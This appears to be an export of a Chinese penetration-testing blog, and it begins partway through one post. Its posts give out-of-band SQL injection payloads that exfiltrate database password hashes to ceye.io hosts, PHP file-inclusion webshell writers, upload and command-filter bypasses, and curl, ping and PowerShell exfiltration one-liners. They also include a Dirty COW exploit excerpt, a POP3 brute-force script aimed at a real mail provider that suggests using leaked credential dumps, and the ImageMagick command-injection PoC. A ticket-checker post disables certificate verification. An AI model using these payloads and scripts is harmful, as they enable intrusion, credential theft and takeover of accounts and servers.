HTTPURITYPE(&apos;http://ip.port.b182oj.ceye.io/oracle&apos;).GETCLOB() FROM DUAL;SELECT DBMS_LDAP.INIT((&apos;oracle.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL;SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&apos;SYS&apos;)||&apos;.ip.port.b182oj.ceye.io&apos;,80) FROM DUAL; MySQLMySQL的函数LOAD_FILE()读取文件内容并将其作为字符串返回：LOAD_FILE()1SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM user WHERE user=&apos;root&apos; LIMIT 1),&apos;.b182oj.ceye.io\\abc&apos;)); PostgreSQLPostgreSQL的声明COPY用于在文件系统的文件和表之间拷贝数据123456789101112131415DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $$DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGINSELECT INTO query_result (SELECT passwdFROM pg_shadow WHERE usename=&apos;postgres&apos;);exec_cmd := E&apos;COPY table_output(content)FROM E\&apos;\\\\\\\\&apos;||query_result||E&apos;.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\&apos;&apos;;EXECUTE exec_cmd;END;$$ LANGUAGE plpgsql SECURITY DEFINER;SELECT temp_function(); 写个脚本： 1234567891011import urllib2for i in range(50): if i==0: continue url = &apos;&apos;&apos;http://xxxx.com.cn/?Id=123&apos;;DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+&apos;.xxxxxxxxx.ceye.io&apos;;EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);--&apos;&apos;&apos; url = url.replace(&quot;dbid=1&quot;,&quot;dbid=&quot;+str(i)) req = urllib2.Request(url) print req.get_full_url() print urllib2.urlopen(req).read()]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>命令执行</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试的一些小技巧]]></title>
    <url>%2F2016%2F11%2F20%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[结合最近学习的知识，总结一下渗透测试中的一些小技巧，仅做参考。 0x01 PHP文件包含利用网站文件上传功能:，比如上传头像之类，可以尝试包含上传的文件。 利用php封装协议php://input和data://:，包含post数据造成php命令执行. 12http://example.com/test.php?url=php://inputPOST:&lt;?php fwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&apos;&lt;?php eval($_POST[&quot;pass&quot;]);?&gt;&apos;)?&gt; 包含log日志文件:当我们提交恶意代码时也会被记录，结合解析漏洞即可getshell(有读权限)。 apache日志默认在/etc/httpd/logs/access_log; 在日志文件中插入PHP代码 方法一 :使用burpsuit抓包访问 ，绕过浏览器编码&lt;&gt; 方法二 :curl 访问不存在的url curl http://example/shell.php?=&lt;?php phpinfo();?&gt; 这样php代码就被写到log里面了 包含一下日志： http://127.0.0.1/lfi/index.php?page=/etc/httpd/logs/access_log 包含/proc/self/environ文件:这需要PHP运行作为一个具有cgion/proc伪文件的系统且PHP脚本有权访问这些伪文件。 填写User-Agent字段如下：&lt;?system(&apos;wget http://eyidaima/shell.txt -O shell.php&apos;);?&gt; 包含会话文件:这需要攻击者能控制会话中的任何字符串值（注入代码，例如phpinfo(），会话文件必须存放在serializedsession文件且PHP脚本能够访问会话文件（通常是/tmp/sess_SESSIONID文件）。 包含其他由php应用创建的文件:只要你能想到的，都可以尝试创建,然后包含他，比如数据库文件，缓存文件，应用程序级别的日志。 0x02 利用.htaccess文件绕过黑名单.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。自定义.htaccess上传，内容如下：123&lt;FileMatch “shell.jpg”&gt; SetHandler application/x-httpd-php &lt;/FileMatch&gt; 同目录下，上传一个shell.jpg文件，内容是一句话，这个时候就成功绕过。 0x03 PHP流封装绕过截断技巧来源：王松 假设存在文件包含的代码为：1234&lt;?php $a = $_GET[&apos;file&apos;];include $a.&apos;.html.php&apos;;?&gt; 但是我们%00无法截断, 只能包含xxxx.html.php 首先我们新建一个hello.html.php，内容为phpinfo(); 然后压缩成zip 然后访问如下网址,即可成功包含压缩文件内的hello.html.php http://example/index.php?file=zip://test.zip%23hello 把我们输入的变量和include后面的变量合起来就是zip://test.zip#hello.html.php 代表当前目录下的test.zip压缩包里面的hello.html.php,于是就包含成功。 0x04 通用防注入系统getshell很多人渗透测试的时候，发现防注入系统，比如说记录了ip，时间，提交数据等等，通过阅读类似程序的源码得知数据记录在sqlin.asp。 提交如下数据：123┼攠數畣整爠煥敵瑳∨≡┩愾 密码 a (加密方式是:ANSI-&gt;Unicode；工具：UNICODE2ANSI)提交 and 1= ┼攠數畣整爠煥敵瑳∨≡┩愾 菜刀连接sqlin.asp即可。 0x05 iis+php黑名单上传突破技巧来源：P牛 在php+window+iis环境下:123双引号==点号;大于符号==问号;小于符号(“&lt;”)==星号(“*”); 该特性只能用于文件上传时覆盖已知的文件，于是这特性便略显鸡肋.不过P牛已经给出完美利用的方法： 思路如下： 利用冒号“：”截断 利用“&lt;”==“*”覆盖上传文件 我们都知道在文件上传时，我们往往会考虑到文件名截断，如%00,:去截断，如：bypass.php:jpg但是冒号截断产生的文件是空白的，里面并不会有任何的内容,虽然生成的php文件里面没有内容，但是php文件总生成了吧，所以我们可以结合上面所说的特性完美成功利用. 首先利用冒号生成我们将要覆盖的php文件，上传文件名为bypass.php:jpg的文件，截断之后产生一个bypass.php的空白php文件。 利用上面的系统特性覆盖该文件：&lt;就等于 *,而*代表任意字符burp里修改文件名为bypass.&lt;&lt;&lt;内容为一句话，这样，就会生成一个带有一句话木马的bypass.php文件。 0x06 命令执行绕过技巧来源：l3m0n escapeshellcmd：escapeshellcmd()对字符串中可能会欺骗 shell命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符之前进行转义为^,利用%1a，可以绕过过滤执行命令。 黑名单绕过 1234执行ls命令：a=l;b=s;$a$bcat hello文件内容：a=c;b=at;c=he;d=llo;$a$b $&amp;#123;c&amp;#125;$&amp;#123;d&amp;#125; 空格绕过 123456绕过空格$&amp;#123;IFS&amp;#125;cat$&amp;#123;IFS&amp;#125;hello或者在读取文件的时候利用重定向符&lt;&gt;cat&lt;&gt;hello 无回显无回显获取数据的需求还是挺大的，比如sql，xxe，xss等等，这个时候一般可以用dns/http通道来获取数据。linux： 1234curl xxxx.ceye.io/`whoami`ping -c 1 `whoami`.xxxx.ceye.io特殊字符或者是空格出现的话，这时候可以通过一些编码来，比如base64curl http://xxxx.ceye.io/$(id|base64) windows:1234567http请求：for /F %x in (&apos;whoami&apos;) do start http://xxx.ceye.io/%xdns请求：获取计算机名：for /F &quot;delims=\&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.xxx.dnslog.info获取用户名：for /F &quot;delims=\ tokens=2&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.xxx.dnslog.info用powershell来base64数据for /F %x in (&apos;whoami&apos;) do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(&apos;%x&apos;));$b=New-Object System.Net.WebClient;$b.DownloadString(&apos;http://xxx.ceye.io/&apos;+$a);]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>linux</tag>
        <tag>命令执行</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[“脏牛”漏洞浅析与复现]]></title>
    <url>%2F2016%2F11%2F02%2F%E2%80%9C%E8%84%8F%E7%89%9B%E2%80%9C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[0x00 漏洞概述Linux内核的内存子系统在处理写时拷贝（Copy-on-Wirte）时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞漏洞编号：CVE-2016-5195 漏洞类型：内核竞态条件漏洞 漏洞危害：低权限用户利用该漏洞技术可以在全版本Liux系统上实现本地提权 影响范围：Linux内核&gt;=2.6.22(07年以后的) 0x01 漏洞利用POC地址 只要Linux内核&gt;=2.6.22即可 gcc命令是一个编译器套件，可用于编译多种语言源码. 编译选项中指定-pthread 会附加一个宏定义 -D_REENTRANT该宏会导致 libc 头文件选择那些thread-safe的实现。-o参数为编译后输出文件名。 执行命令进行将Dirty_COW字符串保存到readfile文件内(写入文件名和内容可自定义，但是如果该文件内容为空，会导致POC测试失败) 0404代表所有用户默认情况下对该文件只有读取权限，无法修改删除 通过./文件名 方式是执行该文件命令 后面一般附加空格参数。 执行dirtyc0w文件 readfile 是文件名参数 m00000...为利用漏洞写入的值. 发现该文件已被输入的字符串m0000...覆盖 0x02 漏洞形成原因Linux写时拷贝技术(copy-on-write) 在Linux程序中，fork（）会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，linux中引入了“写时复制“技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。 竞态条件 竞态条件（race condition）是指设备或系统出现不恰当的执行时序，而得到不正确的结果。 inux内存管理–缺页异常处理 触发异常的线性地址处于用户空间的vma中，但还未分配物理页，如果访问权限OK的话内核就给进程分配相应的物理页。 触发异常的线性地址不处于用户空间的vma中，这种情况得判断是不是因为用户进程的栈空间消耗完而触发的缺页异常。 如果 是的话则在用户空间对栈区域进行扩展，并且分配相应的物理页，如果不是则作为一次非法地址访问来处理，内核将终结进程 缺页中断 缺页中断就是要访问的页不在主存，需要操作系统将其调入主存后再进行访问。在这个时候，被内存映射的文件实际上成了一个分页交换文件。 0x03 触发原理：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657void *madviseThread(void *arg)&#123; char *str; str=(char*)arg; int i,c=0; for(i=0;i&lt;100000000;i++) &#123;/*You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call&gt; while having the page of the executable mmapped in memory.*/ c+=madvise(map,100,MADV_DONTNEED); &#125; printf(&quot;madvise %d\n\n&quot;,c);&#125; void *procselfmemThread(void *arg)&#123; char *str; str=(char*)arg;/*You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16&gt; The in the wild exploit we are aware of doesn&apos;t work on Red Hat&gt; Enterprise Linux 5 and 6 out of the box because on one side of&gt; the race it writes to /proc/self/mem, but /proc/self/mem is not&gt; writable on Red Hat Enterprise Linux 5 and 6.*/ int f=open(&quot;/proc/self/mem&quot;,O_RDWR); int i,c=0; for(i=0;i&lt;100000000;i++) &#123;/*You have to reset the file pointer to the memory position.*/ lseek(f,(uintptr_t) map,SEEK_SET); c+=write(f,str,strlen(str)); &#125; printf(&quot;procselfmem %d\n\n&quot;, c);&#125; int main(int argc,char *argv[])&#123;/*You have to pass two arguments. File and Contents.*/ if (argc&lt;3) &#123; (void)fprintf(stderr, &quot;%s\n&quot;, &quot;usage: dirtyc0w target_file new_content&quot;); return 1; &#125; pthread_t pth1,pth2;/*You have to open the file in read only mode.*/ f=open(argv[1],O_RDONLY); fstat(f,&amp;st); name=argv[1]; 调用write系统调用向/proc/self/mem文件中写入数据时，进入内核态后内核会调用get_user_pages函数获取要写入内存地址。get_user_pages会调用follow_page_mask来获取这块内存的页表项，并同时要求页表项所指向的内存映射具有可写的权限。 第一次获取内存的页表项会因为缺页而失败。get_user_page调用faultin_page进行缺页处理后第二次调用follow_page_mask获取这块内存的页表项，如果需要获取的页表项指向的是一个只读的映射，那第二次获取也会失败。这时候get_user_pages函数会第三次调用follow_page_mask来获取该内存的页表项，并且不再要求页表项所指向的内存映射具有可写的权限，这时是可以成功获取的，获取成功后内核会对这个只读的内存进行强制的写入操作。这个实现是没有问题的，因为本来写入/proc/self/mem就是一个无视映射权限的强行写入，就算是文件映射到虚拟内存中，也不会出现越权写：如果写入的虚拟内存是一个VM_PRIVATE的映射，那在缺页的时候内核就会执行COW操作产生一个副本来进行写入，写入的内容是不会同步到文件中的,如果写入的虚拟内存是一个VM_SHARE的映射，那mmap能够映射成功的充要条件就是进程拥有对该文件的写权限，这样写入的内容同步到文件中也不算越权了。&amp;oq=调用write系统调用向/proc/self/mem文件中写入数据时，进入内核态后内核会调用get_user_pages函数获取要写入内存地址。get_user_pages会调用follow_page_mask来获取这块内存的页表项，并同时要求页表项所指向的内存映射具有可写的权限。第一次获取内存的页表项会因为缺页而失败。get_user_page调用faultin_page进行缺页处理后第二次调用follow_page_mask获取这块内存的页表项，如果需要获取的页表项指向的是一个只读的映射，那第二次获取也会失败。这时候get_user_pages函数会第三次调用follow_page_mask来获取该内存的页表项，并且不再要求页表项所指向的内存映射具有可写的权限，这时是可以成功获取的，获取成功后内核会对这个只读的内存进行强制的写入操作。这个实现是没有问题的，因为本来写入/proc/self/mem就是一个无视映射权限的强行写入，就算是文件映射到虚拟内存中，也不会出现越权写：如果写入的虚拟内存是一个VM_PRIVATE的映射，那在缺页的时候内核就会执行COW操作产生一个副本来进行写入，写入的内容是不会同步到文件中的.如果写入的虚拟内存是一个VM_SHARE的映射，那mmap能够映射成功的充要条件就是进程拥有对该文件的写权限，这样写入的内容同步到文件中也不算越权了。 但是，在上述流程中，如果第二次获取页表项失败之后，另一个线程调用madvice(addr,addrlen,MADV_DONTNEED),其中addr~addrlen是一个只读文件的VM_PRIVATE的只读内存映射，那该映射的页表项会被置空。这时如果get_user_pages函数第三次调用follow_page_mask来获取该内存的页表项。由于这次调用不再要求该内存映射具有写权限，所以在缺页处理的时候内核也不再会执行COW操作产生一个副本以供写入。所以缺页处理完成后后第四次调用follow_page_mask获取这块内存的页表项的时候，不仅可以成功获取，而且获取之后强制的写入的内容也会同步到映射的只读文件中。从而导致了只读文件的越权写。但是，在上述流程中，如果第二次获取页表项失败之后，另一个线程调用madvice(addr,addrlen,MADV_DONTNEED),其中addr~addrlen是一个只读文件的VM_PRIVATE的只读内存映射，那该映射的页表项会被置空。这时如果get_user_pages函数第三次调用follow_page_mask来获取该内存的页表项。由于这次调用不再要求该内存映射具有写权限，所以在缺页处理的时候内核也不再会执行COW操作产生一个副本以供写入。所以缺页处理完成后后第四次调用follow_page_mask获取这块内存的页表项的时候，不仅可以成功获取，而且获取之后强制的写入的内容也会同步到映射的只读文件中。从而导致了只读文件的越权写。 0x04 修复建议升级对应版本.]]></content>
      <tags>
        <tag>运维</tag>
        <tag>渗透测试</tag>
        <tag>linux</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python实现12306车票查询]]></title>
    <url>%2F2016%2F10%2F10%2FPython%E5%AE%9E%E7%8E%B012306%E8%BD%A6%E7%A5%A8%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[今天准备给师傅一块去应急响应，票都定好了，发现忘带身份证了，MDZZ…所以我就这样错失了一次宝贵的机会…更™可恶的是我去退票，竟然给我说没有身份证退不了。。。我特么的要是有身份证，我还退你大爷啊。。。 所以想搞它，一想，算了，凭我这本事搞12306还是别装逼，所以就有了这个脚本。。。源代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Author：w2n1ck@博客：http://byd.dropsec.xyz/&apos;&apos;&apos;import urllib2import jsonimport smtplibimport timeimport codecsfrom email.mime.text import MIMETextimport ssl# 记录日志def log(content): t = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;) f = codecs.open(&apos;watcher.log&apos;, &apos;a&apos;, &apos;utf-8&apos;) f.write(&apos;[%s]%s\n&apos; % (t, content)) f.close()# 发送邮件def send_mail(content): to_list=[&apos;xxx@qq.com&apos;] mail_host = &apos;smtp.163.com&apos; mail_user = &apos;xxx&apos; mail_pass = &apos;xxx&apos; mail_postfix = &apos;163.com&apos; me = &quot;TicketsWatcher&quot;+&quot;&lt;&quot;+mail_user+&quot;@&quot;+mail_postfix+&quot;&gt;&quot; msg = MIMEText(content,_subtype=&apos;plain&apos;,_charset=&apos;gb2312&apos;) msg[&apos;Subject&apos;] = &apos;There are some tickets you need.&apos; msg[&apos;From&apos;] = me msg[&apos;To&apos;] = &quot;;&quot;.join(to_list) server = smtplib.SMTP() server.connect(mail_host) server.ehlo() server.starttls() server.login(mail_user,mail_pass) server.sendmail(me, to_list, msg.as_string()) server.close() log(&apos;sent mail successfully&apos;)try: # 请求地址根据实际要抓取的页面修改，参数包括日期、出发站、到达站 ssl._create_default_https_context = ssl._create_unverified_context resp = urllib2.urlopen(&quot;https://kyfw.12306.cn/otn/lcxxcx/query?purpose_codes=ADULT&amp;queryDate=2016-10-11&amp;from_station=NJH&amp;to_station=SHH&quot;) #print resp result = resp.read() #print result data = json.loads(result) datas = data[&apos;data&apos;][&apos;datas&apos;] print datas for d in datas: if d[&apos;station_train_code&apos;] == &apos;T135&apos;: content = &apos;tickes for hard seat of %s: %s&apos; % (d[&apos;station_train_code&apos;], d[&apos;yz_num&apos;]) log(content) if unicode(d[&apos;yz_num&apos;]) != u&quot;无&quot;: send_mail(content) breakexcept Exception, e: content = &apos;somethings wrong with the program:\n&apos; + str(e) log(content) send_mail(content) 测试结果：说明： 脚本分为三部分： 记录日志 发送邮件 车票信息捕捉 记录日志会在脚本目录下生成一个watch.log文件，这个主要是得结合实时捕捉数据，你可以定时也可以使用crontab,这里我就没在加了(还有十个网站没测呢，政府网站真是尼玛啊，谁有比较好的经验望大牛们不吝分享，不说了都是泪…) 发送邮件部分主要用了smtplib和email库，具体代码为：12345to_list=[&apos;xxx@qq.com&apos;] #接收通知的邮箱mail_host = &apos;smtp.163.com&apos; #设置服务器mail_user = &apos;xxx&apos; #替换为发件邮箱用户名,不带@后面的mail_pass = &apos;xxx&apos; #替换为发件邮箱口令mail_postfix = &apos;163.com&apos; #发件箱的后缀 1msg = MIMEText(content,_subtype=&apos;plain&apos;,_charset=&apos;gb2312&apos;) 第一个参数就是邮件正文，第二个参数是MIME的subtype，传入’plain’，最终的MIME就是’text/plain’，最后设置编码为gb2312，不过为了兼容性，你可以使用utf-8，具体的过程函数我就不解释了。 信息抓取部分，很简单就是把数据变为数组，从数组中匹配信息。这里我遇到一个问题：urllib2.URLError: &lt;urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:590)&gt;这个错误信息主要是因为：SSL: CERTIFICATE_VERIFY_FAILEDPython 升级到 2.7.9 之后引入了一个新特性，当使用urllib.urlopen打开一个 https 链接时，会验证一次 SSL 证书。而当目标网站使用的是自签名的证书时就会抛出一个 urllib2.URLError: 的错误消息. 解决方案：1234import sslimport urllib2ssl._create_default_https_context = ssl._create_unverified_contextprint urllib2.urlopen(&quot;https://www.111cn.net/&quot;).read() 附： smtp协议的基本命令包括：123456789101112HELO 向服务器标识用户身份MAIL 初始化邮件传输 mail from:RCPT 标识单个的邮件接收人；常在MAIL命令后面,可有多个rcpt to:DATA 在单个或多个RCPT命令后,表示所有的邮件接收人已标识,并初始化数据传输,以.结束VRFY 用于验证指定的用户/邮箱是否存在；由于安全方面的原因,服务器常禁止此命令EXPN 验证给定的邮箱列表是否存在,扩充邮箱列表,也常被禁用HELP 查询服务器支持什么命令NOOP 无操作,服务器应响应OKQUIT 结束会话RSET 重置会话,当前传输被取消MAIL FROM 指定发送者地址RCPT TO 指明的接收者地址 SMTP会话的流程： ehlo auth login mail from rcpt to data quit 上面说的是最普通的情况，但是现在好多企业邮件都是安全邮件的，就是通过SSL发送的邮件，这个怎么发呢？SMTP对SSL安全邮件的支持有两种方案，一种老的是专门开启一个465端口来接收ssl邮件，另一种更新的做法是在标准的25端口的smtp上增加一个starttls的命令来支持。 这个很简单，smtplib里就有这个方法，叫smtplib.starttls()。当然，不是所有的邮件系统都支持安全邮件的，这个需要从ehlo的返回值里来确认，如果里面有starttls，才表示支持。 注意：以上的代码为了方便我都没有判断返回值，严格说来，是应该判断一下返回的代码的，在smtp协议中，只有返回代码是2xx或者3xx才能继续下一步，返回4xx或5xx的，都是出错了。]]></content>
      <tags>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 邮箱爆破]]></title>
    <url>%2F2016%2F10%2F03%2FPython-%E9%82%AE%E7%AE%B1%E7%88%86%E7%A0%B4%2F</url>
    <content type="text"><![CDATA[按照师傅给的任务，写了一个企业邮箱的爆破脚本，后续还有FTP,SSH等一些爆破的脚本。 我先说下整体思路： 总体就是利用python的poplib模块来从pop3服务器上交互，根据获取的相关信息，产生结果。POP3协议并不复杂，它也是采用的一问一答式的方式，你向服务器发送一个命令，服务器必然会回复一个信息. 首先验证参数是否正确Sys.argv[]是用来获取命令行参数的，sys.argv[0]表示代码本身文件路径，所以参数从1开始 然后从用户密码文件中读取信息 pop.getwelcome()用来获取连接服务器的响应状态 然后就是脚本的核心代码部分 123456server = &quot;pop.qiye.163.com&quot; //设置pop3服务器地址pop = poplib.POP3(server,110) //连接pop3服务器pop.user(user) //验证用户名auth = pop.pass_(passwd) //验证密码if auth.split(&apos; &apos;)[0]== &quot;+OK&quot;: //判断响应的结果是否“OK” pring user,passwd 最后输出出来相关的用户信息 脚本代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/python# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Author：w2n1ck@博客：http://byd.dropsec.xyz/@Email Pop3 Brute Forcer&apos;&apos;&apos;import threading, time, random, sys, poplibfrom copy import copyif len(sys.argv) !=3: print &quot;\t --------------------------------------------------\n&quot; print &quot;\t Usage: ./Emailpopbrute.py &lt;userlist&gt; &lt;passlist&gt;\n&quot; sys.exit(1)server = &quot;pop.qiye.163.com&quot;success = []try: users = open(sys.argv[1], &quot;r&quot;).readlines()except(IOError): print &quot;[-] Error: urerlist打开失败!\n&quot; sys.exit(1)try: words = open(sys.argv[2], &quot;r&quot;).readlines()except(IOError): print &quot;[-] Error: passlist打开失败!\n&quot; sys.exit(1)try: pop = poplib.POP3(server,110) welcome = pop.getwelcome() print welcome pop.quit()except (poplib.error_proto): welcome = &quot;No Response&quot; passdef mailbruteforce(listuser,listpwd): if len(listuser) &lt; 1 or len(listpwd) &lt; 1 : print &quot;An error occurred: No user or pass list&quot; return 1 for user in listuser: for value in listpwd : user = user.replace(&quot;\n&quot;,&quot;&quot;) value = value.replace(&quot;\n&quot;,&quot;&quot;) try: print &quot;-&quot;*12 print &quot;[+] User:&quot;,user,&quot;Password:&quot;,value time.sleep(1) pop = poplib.POP3(server,110) pop.user(user) auth = pop.pass_(value) print auth if auth.split(&apos; &apos;)[0]!= &quot;+OK&quot; : pop.quit() print &quot;unknown error !&quot; continue if pop.stat()[1] is None or pop.stat()[1] &lt; 1 : pop.quit() print &quot;获取信息失败!&quot; continue ret = (user,value,pop.stat()[0],pop.stat()[1]) success.append(ret) pop.quit() break except: #print &quot;An error occurred:&quot;, msg passprint &quot;\t --------------------------------------------------\n&quot;print &quot;[+] Server:&quot;,serverprint &quot;[+] Port: 995&quot;print &quot;[+] Users Loaded:&quot;,len(users)print &quot;[+] Words Loaded:&quot;,len(words)print &quot;[+] Server response:&quot;,welcome,&quot;\n&quot;mailbruteforce(users,words)print &quot;\t[+] have weakpass :\t&quot;,len(success)if len(success) &gt;=1: for ret in success: print &quot;\n\n[+] Login successful:&quot;,ret[0], ret[1] print &quot;\t[+] Mail:&quot;,ret[2],&quot;emails&quot; print &quot;\t[+] Size:&quot;,ret[3],&quot;bytes\n&quot;print &quot;\n[-] Done&quot; 测试结果： 说明：用户字典文件需要@domain.com，类似zhangsan@domain.com、lisi@domain.com、wangwu@domain.com这样的。由于我也没有企业邮箱的账号密码，也就没测试成功的，要是感兴趣，可以搜一下相关社工裤。 附： python 中 os._exit()， sys.exit()， exit() 的区别是什么？ sys.exit(n) 退出程序引发一个SystemExit异常, 可以捕获异常执行些清理工作. n默认值为0, 表示正常退出. 其他都是非正常退出. 没有捕获这个异常，会直接退出；捕获这个异常可以做一些额外的清理工作。 一般主程序中使用此退出 os._exit(n), 直接退出 Python 解释器，其后的代码都不执行, 不抛异常, 不执行相关清理工作. 常用在子进程的退出. exit() 跟 C 语言等其他语言的 exit() 应该是一样的 pop3收取邮件的过程一般是: 连接pop3服务器 (poplib.POP3.__init__) 发送用户名和密码进行验证 (poplib.POP3.user poplib.POP3.pass_) 获取邮箱中信件信息 (poplib.POP3.stat) 收取邮件 (poplib.POP3.retr) 删除邮件 (poplib.POP3.dele) 退出 (poplib.POP3.quit) 1234567891011121314命令 poplib方法 参数 状态 描述-----------------------------------------------------------------------------------------------USER user username 认可 用户名，此命令与下面的pass命令若成功，将导致状态转换PASS pass_ password 认可 用户密码 APOP apop Name,Digest 认可 Digest是MD5消息摘要-----------------------------------------------------------------------------------------------STAT stat None 处理 请求服务器发回关于邮箱的统计资料，如邮件总数和总字节数UIDL uidl [Msg#] 处理 返回邮件的唯一标识符，POP3会话的每个标识符都将是唯一的LIST list [Msg#] 处理 返回邮件数量和每个邮件的大小RETR retr [Msg#] 处理 返回由参数标识的邮件的全部文本DELE dele [Msg#] 处理 服务器将由参数标识的邮件标记为删除，由quit命令执行RSET rset None 处理 服务器将重置所有标记为删除的邮件，用于撤消DELE命令TOP top [Msg#] 处理 服务器将返回由参数标识的邮件前n行内容，n必须是正整数NOOP noop None 处理 服务器返回一个肯定的响应]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>渗透测试</tag>
        <tag>编程</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ImageMagick命令执行漏洞浅析]]></title>
    <url>%2F2016%2F10%2F02%2FImageMagick%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 前言什么是ImageMagick？ImageMagick是一个功能强大的开源图形处理软件,可以用来读、写和处理超过90种的图片文件,包括流行的JPEG、GIF、 PNG、PDF以及PhotoCD等格式。使用它可以对图片进行切割、旋转、组合等多种特效的处理。由于其功能强大、性能较好,并且对很多语言都有拓展支持,所以在程序开发中被广泛使用。许多网站开发者喜爱使用ImageMagick拓展来做web上的图片处理工作,比如用户头像生成、图片编辑等。 0x01 漏洞描述ImageMagick是一款开源图片处理库，支持PHP、Ruby、NodeJS和Python等多种语言，使用非常广泛。包括PHP imagick、Ruby rmagick和paperclip以及NodeJS imagemagick等多个图片处理插件都依赖它运行。当攻击者构造含有恶意代码得图片时，ImageMagick库对于HTTPPS文件处理不当，没有做任何过滤，可远程实现远程命令执行，进而可能控制服务器。 0x02 影响程度攻击成本：低 危害程度：高 影响范围：ImageMagick 6.9.3-9以前的所有版本 0x03 漏洞分析命令执行漏洞是出在ImageMagick对https形式的文件处理的过程中。 ImageMagick之所以支持那么多的文件格式,是因为它内置了非常多的图像处理库,对于这些图像处理库,ImageMagick给它起了个名字叫做”Delegate”(委托),每个Delegate对应一种格式的文件,然后通过系统的system()命令来调用外部的lib进行处理。调用外部lib的过程是使用系统的system命令来执行的，导致命令执行的代码。 ImageMagick委托的默认配置文件： /etc/ImageMagick/delegates.xml 具体代码请参考：Github-ImageMagick 我们定位到https委托得那一行：1&quot; &lt;delegate decode=\&quot;https\&quot; command=\&quot;&amp;quot;wget&amp;quot; -q -O &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;\&quot;/&gt;&quot; 可以看到，command定义了它对于https文件处理时带入system()函数得命令：&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;。 wget是从网络下载文件得命令，%M是一个占位符，它得具体定义在配置文件中如下：123456789101112131415161718%i input image filename %o output image filename %u unique temporary filename %Z unique temporary filename %# input image signature %b image file size %c input image comment %g image geometry %h image rows (height) %k input image number colors %l image label %m input image format %p page number %q input image depth %s scene number %w image columns (width) %x input image x resolution %y input image y resolution 可以看到%m被定义为输入的图片格式,也就是我们输入的url地址。但是由于只是做了简单的字符串拼接,没有做任何过滤，直接拼接到command命令中，所以我们可以将引号闭合后通过&quot;|&quot;,”`”,”&amp;”等带入其他命令,也就形成了命令注入。 比如我们传入如下代码： https://test.com&quot;|ls “-al 则实际得system函数执行得命令为： “wget” -q -O “%o” “ https://test.com&quot;|ls “-al” 这样，ls -al命令成功执行。 0x04 漏洞利用这个漏洞得poc由老外给出得，如下：1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://&quot;|id; &quot;)&apos;pop graphic-context push和pop是用于堆栈的操作，一个进栈，一个出栈; viewbox是表示SVG可见区域的大小，或者可以想象成舞台大小，画布大小。简单理解就是根据后面得参数选取其中得一部分画面; fill url()是把图片填充到当前元素内; 在其中我们使用了fill url()的形式调用存在漏洞的https delegate,当ImageMagick去处理这个文件时,漏洞就会被触发。 附：ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，允许在其中加载ImageMagick中其他的delegate(比如存在漏洞的https delegate)。并且在图形处理的过程中,ImageMagick会自动根据其内容进行处理,也就是说我们可以将文件随意定义为png、jpg等网站上传允许的格式,这大大增加了漏洞的可利用场景。 利用过程： 创建一个exploit.png文件，包含以下内容： 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://test.com/image.jpg&quot;|ls &quot;-al)&apos;pop graphic-context 执行命令：convert exploit.png 